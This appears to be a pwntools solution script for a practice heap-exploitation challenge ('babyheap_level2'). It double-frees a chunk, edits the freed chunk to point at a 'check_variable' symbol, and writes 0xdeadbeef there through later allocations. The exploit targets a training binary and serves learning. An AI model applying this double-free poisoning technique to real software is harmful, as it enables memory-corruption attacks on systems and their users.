#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or '/challenge/babyheap_level2')
os.chdir('/challenge')
context.terminal = ["tmux", "splitw", "-h"]
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

CHOICE = b"Choice:"
def malloc(p, size, content):
    p.recvuntil(CHOICE)
    p.sendline(b"1")
    p.recvuntil(b"chunk?:")
    p.sendline(b"%d" %size)
    p.sendline(b"%d" %content)

def free(p, index):
    p.recvuntil(CHOICE)
    p.sendline(b"3")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" %index)

def edit(p, index, content):
    p.recvuntil(CHOICE)
    p.sendline(b"2")
    p.recvuntil(b"Index:") 
    p.sendline(b"%d" %index)
    p.recvuntil(b"New content:")
    p.sendline(b"%b" %content)

def exit(p):
    p.recvuntil(CHOICE)
    p.sendline(b"6")

def check(p):
    p.recvuntil(CHOICE)
    p.sendline(b"5")

def launch_attack(p):
    malloc(p, 8, 1)
    free(p, 0)
    free(p, 0)
    malloc(p, 8, 1)
    check_variable_addr = exe.symbols["check_variable"]
    edit(p, 0, p64(check_variable_addr))
    malloc(p, 8, 1)
    malloc(p, 8, 1)
    win_addr = 0xdeadbeef
    edit(p, 2, p64(win_addr))
    malloc(p, 2, 1)
    check(p)
    p.interactive()

p = start()
launch_attack(p)
p.interactive()